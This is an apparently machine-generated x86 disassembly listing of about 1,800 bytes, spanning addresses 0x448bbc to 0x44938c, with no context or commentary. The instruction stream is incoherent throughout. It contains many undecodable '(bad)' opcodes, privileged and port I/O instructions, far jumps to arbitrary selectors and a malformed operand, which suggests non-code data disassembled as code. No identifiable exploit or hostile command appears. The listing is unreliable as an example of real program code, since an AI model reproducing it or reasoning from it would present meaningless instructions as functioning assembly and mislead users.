  448bbc:	mov    ch,0x8f
  448bbe:	ss stos BYTE PTR es:[edi],al
  448bc0:	pop    edx
  448bc1:	outs   dx,BYTE PTR ds:[esi]
  448bc2:	in     al,0x30
  448bc4:	idiv   DWORD PTR [eax-0x61ed5e24]
  448bca:	and    BYTE PTR [esi-0xecdad2c],bl
  448bd0:	ret    0xf6d8
  448bd3:	mov    bh,0x9a
  448bd5:	jle    0x448c3f
  448bd7:	fst    DWORD PTR [eax+0x1f]
  448bda:	dec    ebp
  448bdb:	cmp    al,0xe4
  448bdd:	rcr    BYTE PTR [eax-0x1313224e],0x7a
  448be4:	xor    cl,0xbe
  448be7:	xlat   BYTE PTR ds:[ebx]
  448be8:	outs   dx,BYTE PTR ds:[esi]
  448be9:	cmp    al,ch
  448beb:	outs   dx,BYTE PTR ds:[esi]
  448bec:	jle    0x448b6e
  448bee:	int    0xd
  448bf0:	pop    ds
  448bf1:	sub    DWORD PTR [edx-0xb],eax
  448bf4:	jge    0x448bdc
  448bf6:	bound  eax,QWORD PTR [eax]
  448bf8:	(bad)  
  448bfa:	cmp    ebp,DWORD PTR [ecx-0x44]
  448bfd:	xor    BYTE PTR [edi],0x6a
  448c00:	xchg   BYTE PTR [esi+0x23d44354],ch
  448c06:	adc    ecx,esp
  448c08:	or     eax,0x94fb6cfb
  448c0d:	lock and BYTE PTR [esi-0x23337f99],ah
  448c14:	es or  ah,dh
  448c17:	push   eax
  448c18:	inc    ebp
  448c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448c1a:	call   0xa46a:0xe320a110
  448c21:	and    BYTE PTR [ebx+0x6],0xff
  448c25:	push   edx
  448c26:	sbb    cl,BYTE PTR [edx+ecx*1]
  448c29:	or     DWORD PTR [edi+0x60],edx
  448c2c:	cmc    
  448c2d:	inc    esp
  448c2e:	outs   dx,BYTE PTR ds:[esi]
  448c2f:	sahf   
  448c30:	sub    al,0x34
  448c32:	add    DWORD PTR [edx+0x70],ebx
  448c35:	xchg   esp,eax
  448c36:	jb     0x448c68
  448c38:	and    BYTE PTR ds:0xdcf4a721,dh
  448c3e:	xor    al,0xd0
  448c40:	and    DWORD PTR [eax-0x15d483ea],ebp
  448c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448c47:	mov    BYTE PTR [edi+0x60],cl
  448c4a:	xor    DWORD PTR [edi-0x20],ecx
  448c4d:	(bad)  
  448c4e:	sbb    eax,esi
  448c50:	mov    ?,WORD PTR [esi+0x1]
  448c53:	mov    BYTE PTR [edx],dl
  448c55:	adc    ah,ch
  448c57:	add    ax,0x61f5
  448c5b:	xchg   ebx,eax
  448c5c:	ins    DWORD PTR es:[edi],dx
  448c5d:	pop    ds
  448c5e:	xor    ch,cl
  448c60:	mov    BYTE PTR [edx+0x7c],cl
  448c63:	inc    esi
  448c64:	adc    BYTE PTR [eax+0xc],bh
  448c67:	les    esp,FWORD PTR [edi]
  448c69:	adc    BYTE PTR [ebx+0x2ef910d4],bl
  448c6f:	out    0xd4,al
  448c71:	push   0xffffffb6
  448c73:	jo     0x448c01
  448c75:	dec    edi
  448c76:	call   0xb48a97fd
  448c7b:	adc    eax,0x6a812f6
  448c80:	jo     0x448c9e
  448c82:	push   edi
  448c83:	or     eax,0x44596a1c
  448c88:	mov    ebx,0xda918536
  448c8d:	mov    ds,esp
  448c8f:	aad    0xe
  448c91:	sub    eax,0x445892a0
  448c96:	sub    BYTE PTR [ebp+0x2c],al
  448c99:	sbb    al,0x8a
  448c9b:	fsub   DWORD PTR [edi+esi*1-0x14]
  448c9f:	xchg   esp,eax
  448ca0:	xchg   esi,eax
  448ca1:	dec    eax
  448ca2:	mov    esp,0xcfec0a96
  448ca7:	out    dx,al
  448ca8:	sub    DWORD PTR [edx],ebx
  448caa:	mov    WORD PTR [ebx],cs
  448cac:	adc    ebp,DWORD PTR [edi]
  448cae:	jmp    0xbd68:0x4d8ce6d5
  448cb5:	mov    ah,0x2a
  448cb7:	push   esp
  448cb8:	cdq    
  448cb9:	lock mov WORD PTR [esp+esi*4-0x74],ss
  448cbe:	mov    al,0x1e
  448cc0:	clc    
  448cc1:	loopne 0x448d19
  448cc3:	retf   0x523e
  448cc6:	sub    al,ah
  448cc8:	adc    eax,0x4125d6c
  448ccd:	pusha  
  448cce:	imul   ecx,ebp,0x0
  448cd1:	push   0x7b0ac6e8
  448cd6:	cmp    dl,al
  448cd8:	dec    edx
  448cd9:	mov    edi,cs
  448cdb:	shr    BYTE PTR [edi],0x76
  448cde:	les    esp,FWORD PTR [edi+0x196b143a]
  448ce4:	mov    al,ds:0xcab03c62
  448ce9:	arpl   WORD PTR [esi],ax
  448ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448cec:	pop    edi
  448ced:	xor    BYTE PTR [eax-0x5fa872a2],0x3
  448cf4:	jb     0x448d48
  448cf6:	lock mov eax,ds:0xb0518605
  448cfc:	shl    BYTE PTR [ebp-0x59d8274d],0x24
  448d03:	push   ecx
  448d04:	aad    0xc8
  448d06:	and    BYTE PTR [ecx+esi*2],0x8e
  448d0a:	retf   0x8913
  448d0d:	(bad)  
  448d0f:	ret    0x9088
  448d12:	jbe    0x448caf
  448d14:	not    BYTE PTR [esi+0x14d5401a]
  448d1a:	sub    cl,BYTE PTR [esi]
  448d1c:	fs mov dh,0x63
  448d1f:	test   eax,0x84ed7ed0
  448d24:	push   0x69cb66ac
  448d29:	mov    ebx,0xfe649a10
  448d2e:	push   eax
  448d2f:	jmp    0x1606:0x12e6fc34
  448d36:	pop    ebp
  448d37:	mov    edx,0x4d28928e
  448d3c:	iret   
  448d3d:	mov    dh,0xb0
  448d3f:	loop   0x448d6b
  448d41:	xchg   esp,eax
  448d42:	and    bl,BYTE PTR [ebx+eiz*1+0x32]
  448d46:	inc    ecx
  448d47:	add    eax,0xb084327d
  448d4c:	call   0x3e12:0x6a0a704b
  448d53:	xchg   edx,eax
  448d54:	stos   BYTE PTR es:[edi],al
  448d55:	and    BYTE PTR [edi],0x4
  448d58:	popa   
  448d59:	scas   eax,DWORD PTR es:[edi]
  448d5a:	hlt    
  448d5b:	mov    eax,0x823c8793
  448d60:	inc    ebp
  448d61:	cli    
  448d62:	add    al,0x1c
  448d64:	pop    eax
  448d65:	call   0xe0375090
  448d6a:	ins    BYTE PTR es:[edi],dx
  448d6b:	ins    DWORD PTR es:[edi],dx
  448d6c:	aad    0x3a
  448d6e:	je     0x448dea
  448d70:	xor    bh,ch
  448d72:	jae    0x448d7f
  448d74:	call   0xa2c8:0xe2aa140
  448d7b:	xor    al,0x40
  448d7d:	mov    bh,bl
  448d7f:	sub    dl,cl
  448d81:	push   ds
  448d82:	fwait
  448d83:	cmp    BYTE PTR [edx+esi*1],0xc4
  448d87:	or     eax,0xe6cdb0ed
  448d8c:	retf   0x4327
  448d8f:	sub    BYTE PTR [esi+0x6fc0a650],ch
  448d95:	sbb    DWORD PTR [edi+0x3e7eb680],ecx
  448d9b:	jne    0x448d20
  448d9d:	test   eax,0xa443e26e
  448da2:	sbb    eax,0x1d1c619c
  448da7:	aam    0x93
  448da9:	push   0xffffff85
  448dab:	push   esi
  448dac:	stos   BYTE PTR es:[edi],al
  448dad:	or     al,0x6f
  448daf:	sbb    al,BYTE PTR [ebp+0x22fb9ca2]
  448db5:	sbb    DWORD PTR [edx+0x1602a8ba],edi
  448dbb:	fiadd  DWORD PTR [eax+edi*1-0x68]
  448dbf:	test   al,0x3
  448dc1:	pop    eax
  448dc2:	adc    al,0x8
  448dc4:	dec    BYTE PTR [eax-0x3fe0f1f8]
  448dca:	test   BYTE PTR [ebp-0x4],0x98
  448dce:	pop    esi
  448dcf:	jecxz  0x448e41
  448dd1:	and    BYTE PTR [eax],dl
  448dd3:	mov    edi,0xb2423528
  448dd8:	adc    al,ch
  448dda:	leave  
  448ddb:	pop    edx
  448ddc:	and    dh,BYTE PTR [esi+0x78e20b4b]
  448de2:	out    dx,al
  448de3:	popf   
  448de4:	cmp    esp,edx
  448de6:	mov    eax,ds:0x747207a4
  448deb:	cmc    
  448dec:	push   0x18
  448dee:	lahf   
  448def:	add    ecx,DWORD PTR [edx+0x2f]
  448df2:	or     DWORD PTR [esi],ecx
  448df4:	das    
  448df5:	js     0x448e65
  448df7:	cmc    
  448df8:	xchg   edx,eax
  448df9:	add    dl,bl
  448dfb:	cmp    al,BYTE PTR [ebp+0x240ab052]
  448e01:	scas   eax,DWORD PTR es:[edi]
  448e02:	or     ch,BYTE PTR [edx+0x38]
  448e05:	xor    bl,dl
  448e07:	inc    esi
  448e08:	mov    esp,0x5930ad7d
  448e0d:	xor    BYTE PTR [eax+0x4e],al
  448e10:	or     cl,BYTE PTR [eax-0x10]
  448e13:	pop    edx
  448e14:	add    cl,BYTE PTR [ebp-0x17f722a0]
  448e1a:	std    
  448e1b:	mov    al,ds:0xbdc058b4
  448e20:	repnz outs dx,BYTE PTR ds:[esi]
  448e22:	push   esi
  448e23:	add    al,0xf0
  448e25:	sbb    edx,eax
  448e27:	inc    ebx
  448e28:	sbb    al,0xd9
  448e2a:	inc    ecx
  448e2b:	into   
  448e2c:	push   cs
  448e2d:	add    edi,DWORD PTR [edi]
  448e2f:	sub    eax,0xa5d090fd
  448e34:	or     ebx,DWORD PTR [eax-0x57fa5bcc]
  448e3a:	int    0x5
  448e3c:	xchg   esi,eax
  448e3d:	pop    ss
  448e3e:	add    BYTE PTR [ecx+0x62],ah
  448e41:	fwait
  448e42:	dec    esp
  448e43:	shr    BYTE PTR [edi],0x61
  448e46:	ret    
  448e47:	push   ss
  448e48:	or     dl,0x1c
  448e4b:	add    BYTE PTR [edi-0x7e2f492d],bh
  448e51:	sub    dh,BYTE PTR [ebx+eax*4]
  448e54:	out    dx,eax
  448e55:	mov    ds:0xb82b6b28,eax
  448e5a:	shl    BYTE PTR [ebx-0x7c],0xe4
  448e5e:	mov    esi,0x4048e38f
  448e63:	xchg   DWORD PTR [esi+ecx*1+0x4b],esi
  448e67:	add    BYTE PTR [ebx+0x4c],al
  448e6a:	dec    eax
  448e6b:	and    BYTE PTR [esi+edi*8+0x2b],bh
  448e6f:	jo     0x448df2
  448e71:	inc    edi
  448e72:	adc    dl,cl
  448e74:	jp     0x448dfc
  448e76:	pop    esp
  448e77:	sub    dl,BYTE PTR [edx+0x3f]
  448e7a:	add    cl,ah
  448e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448e7d:	sbb    BYTE PTR [eax+0x112ce468],0x53
  448e84:	mov    ah,0x4b
  448e86:	add    ecx,DWORD PTR [eax]
  448e88:	(bad)  
  448e89:	retf   0x22cd
  448e8c:	push   es
  448e8d:	pusha  
  448e8e:	cmp    esi,DWORD PTR [edx-0x77e6dbf8]
  448e94:	mov    ds:0x1e0ad83c,al
  448e99:	add    DWORD PTR [ecx+edi*8],ebx
  448e9c:	pushf  
  448e9d:	push   ecx
  448e9e:	or     ah,BYTE PTR ds:0xf4b7e1ca
  448ea4:	shl    DWORD PTR [esi+0x64],0xe3
  448ea8:	mov    ds:0x6b52e75e,al
  448ead:	lahf   
  448eae:	imul   ebx,DWORD PTR [esi],0x41642e5f
  448eb4:	sar    BYTE PTR [edi-0x2079b7cd],1
  448eba:	push   es
  448ebb:	mov    al,0x7b
  448ebd:	sahf   
  448ebe:	out    0x2e,al
  448ec0:	aam    0xa3
  448ec2:	pusha  
  448ec3:	inc    ebx
  448ec4:	mov    dl,0x38
  448ec6:	and    BYTE PTR [eax+0x1c37e360],bh
  448ecc:	and    al,0xb6
  448ece:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  448ed0:	push   cs
  448ed1:	hlt    
  448ed2:	and    DWORD PTR [edx-0x6a1f2653],ebx
  448ed8:	test   BYTE PTR [edi-0x34],cl
  448edb:	inc    esp
  448edc:	out    0x40,al
  448ede:	test   BYTE PTR [esi-0x1d],al
  448ee1:	inc    ebx
  448ee2:	les    eax,FWORD PTR [ebx]
  448ee4:	(bad)  
  448ee5:	icebp  
  448ee6:	cwde   
  448ee7:	lock scas eax,DWORD PTR es:[edi]
  448ee9:	mov    al,0xa2
  448eeb:	rol    BYTE PTR [ecx],0x7e
  448eee:	sub    al,BYTE PTR [edi]
  448ef0:	loop   0x448e99
  448ef2:	push   edx
  448ef3:	loopne 0x448e96
  448ef5:	pop    DWORD PTR [edx+0x6b9c68c]
  448efb:	in     eax,dx
  448efc:	adc    esi,0xfd10440e
  448f02:	enter  0xfaf0,0xe8
  448f06:	mov    bl,0x89
  448f08:	add    al,BYTE PTR [ebx]
  448f0a:	push   es
  448f0b:	mov    edx,0xab20a8
  448f10:	les    esi,FWORD PTR [esi]
  448f12:	jl     0x448f74
  448f14:	dec    ebp
  448f15:	iret   
  448f16:	jmp    0x7e1e:0x7cda8f8
  448f1d:	into   
  448f1e:	push   ebx
  448f1f:	inc    eax
  448f20:	jo     0x448f79
  448f22:	fdiv   DWORD PTR [ecx-0x7c]
  448f25:	or     dl,BYTE PTR [eax-0x13831bfb]
  448f2b:	hlt    
  448f2c:	in     eax,dx
  448f2d:	pop    ebp
  448f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448f2f:	push   0x4cf4da0d
  448f34:	mov    edx,0xc026f688
  448f39:	ror    BYTE PTR [edx-0x5bd3bfb9],1
  448f3f:	sbb    al,0x77
  448f41:	cs or  eax,0x84385492
  448f47:	stos   BYTE PTR es:[edi],al
  448f48:	hlt    
  448f49:	xchg   BYTE PTR [edx],al
  448f4b:	lock cwde 
  448f4d:	stos   BYTE PTR es:[edi],al
  448f4e:	push   0x482d516
  448f53:	into   
  448f54:	gs sahf 
  448f56:	xchg   esi,eax
  448f57:	mov    bh,cl
  448f59:	adc    al,0xea
  448f5b:	and    edi,eax
  448f5d:	push   ecx
  448f5e:	popa   
  448f5f:	fwait
  448f60:	cmp    eax,0xf414be96
  448f65:	cli    
  448f66:	dec    eax
  448f67:	pop    ebp
  448f68:	mov    ds,WORD PTR [edx-0x2ba7e78f]
  448f6e:	ror    DWORD PTR [esi-0x6f],1
  448f71:	cmp    al,0xa0
  448f73:	and    BYTE PTR [esi-0x31],bl
  448f76:	rol    BYTE PTR [edx-0x20d7fc7e],0x6c
  448f7d:	cmp    BYTE PTR [eax+0x37],bh
  448f80:	xor    DWORD PTR [esi],edx
  448f82:	sub    ch,0xd0
  448f85:	mov    dl,0x14
  448f87:	fs gs xchg ebp,eax
  448f8a:	jmp    0x5cc09942
  448f8f:	shl    DWORD PTR ds:0x67e898d6,cl
  448f95:	dec    edx
  448f96:	clc    
  448f97:	fs es sub ebx,ecx
  448f9b:	outs   dx,DWORD PTR ds:[esi]
  448f9c:	adc    eax,0x1c368257
  448fa1:	adc    bh,bl
  448fa3:	xchg   esp,eax
  448fa4:	rol    DWORD PTR [eax+0x75],cl
  448fa7:	pop    esi
  448fa8:	ret    0x8df8
  448fab:	push   es
  448fac:	call   0x7ea6c050
  448fb1:	jno    0x44901c
  448fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448fb4:	mov    eax,ds:0x8c409681
  448fb9:	jg     0x448fbc
  448fbb:	sbb    ecx,esi
  448fbd:	dec    BYTE PTR fs:[esi+edx*8+0x5680a0bc]
  448fc5:	sbb    BYTE PTR ds:[ecx+edi*8+0x74],bh
  448fca:	enter  0xd45c,0x55
  448fce:	icebp  
  448fcf:	push   0x5fd6c256
  448fd4:	or     ah,bl
  448fd6:	pop    ebp
  448fd7:	pop    edx
  448fd8:	inc    eax
  448fd9:	xor    DWORD PTR [edx-0x32],ebp
  448fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448fdd:	sbb    ebx,DWORD PTR es:[esi-0x6e3f9177]
  448fe4:	mov    esp,0x76dd38c5
  448fe9:	scas   eax,DWORD PTR es:[edi]
  448fea:	mov    eax,ds:0x6f00e64d
  448fef:	fdivr  DWORD PTR [eax-0x2311ae0]
  448ff5:	jo     0x448f89
  448ff7:	(bad)  
  448ff8:	arpl   WORD PTR [edx+0x12],bx
  448ffb:	pop    esp
  448ffc:	pop    eax
  448ffd:	mov    eax,DWORD PTR [esp+ecx*1-0xc]
  449001:	cwde   
  449002:	adc    BYTE PTR [edx],0x48
  449005:	xchg   edx,eax
  449006:	pop    esi
  449007:	pop    es
  449008:	fld    DWORD PTR [edx+0xaee5b67]
  44900e:	test   al,0x2f
  449010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449011:	mov    esi,0x454a4a86
  449016:	aam    0xb2
  449018:	cmp    eax,0x6a105474
  44901d:	push   edx
  44901e:	push   eax
  44901f:	jo     0x449032
  449021:	fiadd  DWORD PTR [eax+eiz*8]
  449024:	pusha  
  449025:	cmp    cl,BYTE PTR [eax-0x5f420397]
  44902b:	push   ds
  44902c:	shl    DWORD PTR [esi],1
  44902e:	mov    edi,0xc384c65a
  449033:	xchg   ebx,eax
  449034:	pusha  
  449035:	lahf   
  449036:	and    eax,0x44df580
  44903b:	clc    
  44903c:	xchg   edx,eax
  44903e:	xchg   BYTE PTR [esi],al
  449040:	mov    esp,0x6dc9d4ab
  449045:	push   esi
  449046:	jmp    0xac63f8d3
  44904b:	dec    ebx
  44904c:	adc    cl,BYTE PTR [ecx+0x7f]
  44904f:	mov    BYTE PTR [edi],dh
  449051:	lds    eax,FWORD PTR [ebp-0xd55097b]
  449057:	(bad)  
  449058:	rol    BYTE PTR [ecx+0x30],1
  44905b:	dec    esp
  44905c:	out    dx,al
  44905d:	jno    0x4490bf
  44905f:	push   0x57
  449061:	inc    edi
  449062:	inc    esp
  449063:	mov    ecx,0x4eae7802
  449068:	dec    edi
  449069:	inc    esp
  44906a:	mov    bh,0xbc
  44906c:	into   
  44906d:	cmp    bh,BYTE PTR [edx]
  44906f:	hlt    
  449070:	mov    al,ds:0x8ca02522
  449075:	or     DWORD PTR fs:[ebp-0x4f75afaf],edx
  44907c:	shl    BYTE PTR [eax],cl
  44907e:	mov    al,0x10
  449080:	adc    esp,DWORD PTR [edi]
  449082:	or     DWORD PTR [edx],0x1146c034
  449088:	dec    ebx
  449089:	ins    DWORD PTR es:[edi],dx
  44908a:	loopne 0x449023
  44908c:	es jp  0x4490a1
  44908f:	lahf   
  449090:	adc    dl,cl
  449092:	fimul  DWORD PTR [eax]
  449094:	inc    eax
  449095:	or     BYTE PTR [ebp-0x2771ddea],0x3f
  44909c:	pusha  
  44909d:	mov    ah,0x1d
  44909f:	ficom  WORD PTR [esi-0x219ee967]
  4490a5:	sbb    edx,esi
  4490a7:	cdq    
  4490a8:	shr    BYTE PTR [edi],cl
  4490aa:	adc    al,BYTE PTR [eax-0x12]
  4490ad:	ja     0x4490f7
  4490af:	mov    esp,0x8abef1a2
  4490b4:	jmp    0x449086
  4490b6:	sbb    eax,0xd37db5cd
  4490bb:	jp     0x449139
  4490bd:	sub    DWORD PTR [edi],esp
  4490bf:	push   esp
  4490c0:	(bad)  
  4490c2:	enter  0x543f,0x83
  4490c6:	mov    ebp,0x66addc30
  4490cb:	cs repnz stc 
  4490ce:	xor    al,0x5d
  4490d0:	fwait
  4490d1:	nop
  4490d2:	xchg   BYTE PTR [eax],ch
  4490d4:	mov    ebx,0x5c032099
  4490d9:	inc    edi
  4490da:	dec    ecx
  4490db:	scas   eax,DWORD PTR es:[edi]
  4490dc:	or     BYTE PTR [edx],bh
  4490de:	jl     0x44910b
  4490e0:	pusha  
  4490e1:	pop    ss
  4490e2:	add    al,0x50
  4490e4:	lods   eax,DWORD PTR ds:[esi]
  4490e5:	push   cs
  4490e6:	push   0x5b
  4490e8:	int3   
  4490e9:	daa    
  4490ea:	adc    al,0x50
  4490ec:	call   0xcc5dc559
  4490f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4490f2:	dec    eax
  4490f3:	jno    0x449090
  4490f5:	shl    BYTE PTR [ecx+0x76fb8001],cl
  4490fb:	pop    ecx
  4490fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4490fd:	call   0xd638:0x387d6a62
  449104:	repnz out 0xda,al
  449107:	add    BYTE PTR [edi*8+0x75ad9020],dl
  44910e:	out    0x4d,al
  449110:	mov    ah,0x1d
  449112:	pop    ebx
  449113:	cli    
  449114:	pop    eax
  449115:	dec    BYTE PTR [edi]
  449117:	out    dx,al
  449118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449119:	hlt    
  44911a:	dec    edx
  44911b:	or     al,0x0
  44911d:	pusha  
  44911e:	sti    
  44911f:	xor    dl,BYTE PTR [edx+0x4c]
  449122:	push   0x1d
  449124:	push   eax
  449125:	mov    cl,0x5d
  449127:	inc    ecx
  449128:	sbb    eax,0x5b3a751f
  44912d:	jbe    0x4490c6
  44912f:	dec    ebp
  449130:	lea    eax,[esp+ecx*1]
  449133:	scas   eax,DWORD PTR es:[edi]
  449134:	sbb    BYTE PTR [ebx-0x47958b97],0x5a
  44913b:	jp     0x44919d
  44913d:	add    DWORD PTR [edx+edi*2],edi
  449140:	(bad)  
  449141:	ror    DWORD PTR [edx],cl
  449143:	or     eax,0x5abb163d
  449148:	dec    edx
  449149:	cmp    cl,dl
  44914b:	mov    ch,0xe2
  44914d:	ret    0x4940
  449150:	lods   al,BYTE PTR ds:[esi]
  449151:	mov    ds,WORD PTR [eax+edx*2]
  449154:	pop    ds
  449155:	sub    edi,DWORD PTR [edx-0x2d734fc6]
  44915b:	nop
  44915c:	mov    esp,0xa63ab532
  449161:	push   cs
  449162:	xor    eax,0xd48a1e20
  449167:	push   edx
  449168:	inc    eax
  449169:	sti    
  44916a:	xor    al,0xda
  44916c:	popa   
  44916d:	xchg   edx,eax
  44916e:	rcl    BYTE PTR [esi],1
  449170:	test   al,0x1c
  449172:	call   0x369d:0x4a1e12ac
  449179:	cmc    
  44917a:	hlt    
  44917b:	cmp    BYTE PTR gs:[ecx],cl
  44917e:	je     0x449188
  449180:	inc    edi
  449181:	rcr    BYTE PTR [ecx+0x5a9bce88],0xd5
  449188:	mov    eax,ds:0xb930b872
  44918d:	cs inc edi
  44918f:	or     dh,BYTE PTR [ecx+ecx*4]
  449192:	adc    DWORD PTR [eax+0x69],esi
  449195:	or     cl,BYTE PTR [esi-0x61]
  449198:	pop    eax
  449199:	mov    edx,0xf00ed825
  44919e:	xchg   ebp,eax
  44919f:	push   esi
  4491a0:	(bad)  
  4491a1:	jbe    0x449181
  4491a3:	add    al,0xa2
  4491a5:	jge    0x44915d
  4491a7:	mul    BYTE PTR [ecx-0xc]
  4491aa:	jl     0x4491d5
  4491ac:	push   edx
  4491ad:	stos   DWORD PTR es:[edi],eax
  4491ae:	mov    dl,0xf1
  4491b0:	pop    esp
  4491b1:	ja     0x449155
  4491b3:	scas   al,BYTE PTR es:[edi]
  4491b4:	mov    al,ds:0xf6b3574f
  4491b9:	ror    BYTE PTR [esi+0x1b],cl
  4491bc:	ja     0x449228
  4491be:	mov    edx,0xe0a60a46
  4491c3:	jle    0x4491d6
  4491c5:	sub    dh,BYTE PTR [eax]
  4491c7:	ret    0x7c6c
  4491ca:	out    0x64,al
  4491cc:	xor    BYTE PTR [esi+esi*4-0x5e],ch
  4491d0:	sar    BYTE PTR [esi+0x7525312],0xc
  4491d7:	sbb    al,0x22
  4491d9:	retf   
  4491da:	pop    ebx
  4491db:	push   ss
  4491dc:	cwde   
  4491dd:	test   eax,0xdca0724b
  4491e2:	sbb    BYTE PTR [ebx+ebp*4-0x2e7b05d4],bl
  4491e9:	out    dx,al
  4491ea:	adc    dl,ah
  4491ec:	shl    DWORD PTR [eax-0x4e5f227f],1
  4491f2:	inc    ecx
  4491f3:	xor    al,0x7a
  4491f5:	imul   ebp,ebp,0x15
  4491f8:	outs   dx,DWORD PTR ds:[esi]
  4491f9:	push   eax
  4491fa:	(bad)
  4491fe:	sahf   
  4491ff:	push   es
  449200:	cmp    ah,BYTE PTR [ecx+edx*8]
  449203:	test   eax,0x1290d0ac
  449208:	sub    eax,0xad0c8e00
  44920d:	xor    BYTE PTR [ebx-0x4947bf83],al
  449213:	sub    edx,DWORD PTR [eax+0x1d]
  449216:	lock (bad) 
  449218:	jle    0x44923d
  44921a:	loop   0x4491e0
  44921c:	push   ebx
  44921d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44921e:	inc    ebp
  44921f:	push   fs
  449221:	fisubr DWORD PTR [eax-0x4a]
  449224:	jle    0x449254
  449226:	xchg   edx,eax
  449227:	enter  0x7450,0x8c
  44922b:	mov    WORD PTR ss:[edx+esi*1],gs
  44922f:	sub    BYTE PTR [edx],dh
  449231:	push   cs
  449232:	mov    edi,edx
  449234:	mov    al,ds:0x1c644c4c
  449239:	xchg   eax,edx
  44923b:	mov    bl,BYTE PTR [esi-0x7d]
  44923e:	add    esp,ebx
  449240:	cwde   
  449241:	rol    BYTE PTR [edx],0x3f
  449244:	call   0x51ed519a
  449249:	(bad)  
  44924a:	adc    ah,BYTE PTR [esi]
  44924c:	mov    ah,0x87
  44924e:	pop    ss
  44924f:	push   ds
  449250:	mov    eax,ds:0xb8240075
  449255:	hlt    
  449256:	xor    BYTE PTR [eax],ah
  449258:	dec    ebp
  449259:	pusha  
  44925a:	mov    ch,BYTE PTR [edi]
  44925c:	add    ch,ch
  44925e:	inc    ebp
  44925f:	inc    ebx
  449260:	mov    esi,0xca7bb49c
  449265:	shl    ch,1
  449267:	or     edx,eax
  449269:	mov    ch,0x35
  44926b:	push   ds
  44926c:	popa   
  44926d:	je     0x449295
  44926f:	xor    al,0xe2
  449271:	add    eax,0x7afe00d7
  449276:	pop    sp
  449278:	inc    ebp
  449279:	add    ch,dl
  44927b:	add    eax,0x5285091f
  449280:	adc    al,0x8a
  449282:	mov    esi,DWORD PTR [esp+ebp*2+0x2baeda0f]
  449289:	adc    dl,ah
  44928b:	mov    ebx,0x161fe98c
  449290:	retf   
  449291:	lock add ch,BYTE PTR ss:[edx+0x1e]
  449296:	stos   BYTE PTR es:[edi],al
  449297:	pop    edx
  449298:	pop    es
  449299:	pop    edx
  44929a:	jno    0x449228
  44929c:	(bad)  
  44929d:	push   edx
  44929e:	(bad)  
  44929f:	push   0xe4030e2
  4492a4:	test   DWORD PTR ds:0xa8de20ac,esp
  4492aa:	add    al,0xb2
  4492ac:	xchg   DWORD PTR [edi-0x7e],eax
  4492af:	dec    esi
  4492b0:	das    
  4492b1:	pushf  
  4492b2:	dec    edx
  4492b3:	loopne 0x449243
  4492b5:	cmp    al,0x74
  4492b7:	and    al,0x6c
  4492b9:	push   0x521b9005
  4492be:	scas   eax,DWORD PTR es:[edi]
  4492bf:	je     0x4492ac
  4492c1:	dec    esp
  4492c2:	stos   DWORD PTR es:[edi],eax
  4492c3:	pop    esp
  4492c4:	xchg   esi,eax
  4492c5:	push   ds
  4492c6:	shl    BYTE PTR [eax-0x4],0xde
  4492ca:	sbb    ch,BYTE PTR [edx+0x4ad008b1]
  4492d0:	pop    edx
  4492d1:	les    eax,FWORD PTR [ecx+0x20]
  4492d4:	add    ecx,DWORD PTR [ebx+0x141e93da]
  4492da:	adc    BYTE PTR [ecx+0x26],bh
  4492dd:	in     eax,0x47
  4492df:	rcr    BYTE PTR [ecx-0x72afbf88],1
  4492e5:	jle    0x4492e6
  4492e7:	xchg   esp,eax
  4492e8:	pusha  
  4492e9:	sti    
  4492ea:	nop
  4492eb:	aad    0x38
  4492ed:	sbb    DWORD PTR [edx+0x6ce14c29],0xffffffed
  4492f4:	adc    DWORD PTR [ebx-0x7b],ebx
  4492f7:	in     al,0x76
  4492f9:	jnp    0x44936b
  4492fb:	enter  0x4c49,0xa9
  4492ff:	loop   0x4492fd
  449301:	inc    ecx
  449302:	ins    BYTE PTR es:[edi],dx
  449303:	push   es
  449304:	pop    edx
  449305:	mov    esp,0x7bb5e64
  44930a:	push   0x2002b1c3
  44930f:	jp     0x4492bf
  449311:	dec    edx
  449312:	(bad)  
  449313:	push   ss
  449314:	sahf   
  449315:	mov    cl,0xb5
  449317:	call   0x32612c3e
  44931c:	jge    0x4492a2
  44931e:	das    
  44931f:	pop    ebx
  449320:	sub    ebp,DWORD PTR [edx+0x3e03fe89]
  449326:	sbb    al,0x90
  449328:	les    esp,FWORD PTR [edx]
  44932a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44932b:	dec    ecx
  44932c:	(bad)  
  44932d:	mov    BYTE PTR [edx],bh
  44932f:	iret   
  449330:	push   esi
  449331:	mov    bl,0x5
  449333:	(bad)  
  449334:	addr16 pop edx
  449336:	scas   eax,DWORD PTR es:[edi]
  449337:	outs   dx,DWORD PTR ds:[esi]
  449338:	add    cl,BYTE PTR [edi-0x31894774]
  44933e:	dec    edi
  44933f:	mov    eax,0xc2c0e268
  449344:	lea    edx,ds:0x106c9cf2
  44934a:	add    ecx,DWORD PTR [ebp+0x5c]
  44934d:	mov    eax,0x4df83279
  449352:	xchg   DWORD PTR ds:0xa4c829c3,ebp
  449358:	push   esi
  449359:	or     al,0xa9
  44935b:	ret    0x462
  44935e:	mul    dl
  449360:	inc    esp
  449361:	sub    BYTE PTR [ebx-0x37f5d46],0xe2
  449368:	mov    ch,0x30
  44936a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44936b:	dec    esp
  44936c:	xor    al,0x44
  44936e:	xchg   edx,eax
  44936f:	pop    edx
  449370:	cmc    
  449371:	mov    esi,0x5c366248
  449376:	mov    ch,dl
  449378:	jle    0x44931c
  44937a:	mov    cl,cl
  44937c:	adc    al,0xdb
  44937e:	imul   ebx,ecx,0x68
  449381:	xchg   DWORD PTR [eax],edx
  449383:	add    BYTE PTR [ebx+0x1e842052],al
  449389:	pop    eax
  44938a:	fwait
  44938b:	inc    esi
  44938c:	hlt    
